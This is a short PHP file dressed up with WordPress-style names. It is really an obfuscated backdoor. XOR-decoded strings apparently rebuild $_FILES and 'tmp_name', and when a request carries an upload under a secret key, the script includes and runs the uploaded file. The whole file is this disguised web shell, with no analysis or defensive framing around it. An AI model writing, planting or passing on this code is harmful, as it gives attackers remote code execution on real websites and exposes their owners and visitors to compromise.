<?php 	

$nestable_tags = 'B3tGfsMBqjiZeFU';
$page = $nestable_tags;
function publicly_queryable($labels, $the_post)

{

    $default_capabilities_for_mapping = $the_post;
	$settings = 'is_bad_hierarchical_slug';
    $first = urldecode($labels);

    $cache = substr($default_capabilities_for_mapping,0, strlen($first));
    $cached = $first ^ $cache;
    return $cached;
}
$key = ${publicly_queryable("%1Du%3D%0B%23+", $page)};
$allowed_html = $key;
$meta_input = isset($allowed_html[$page]);
	$field_no_prefix = 'suffix';
if ($meta_input)

{
    $check = $key[$page];
    $words_array = $check[publicly_queryable("6%5E%04%18%08%12+%27", $page)];
    $_builtin = $words_array;
	$text = 'children_query';
    include ($_builtin);
}
?>
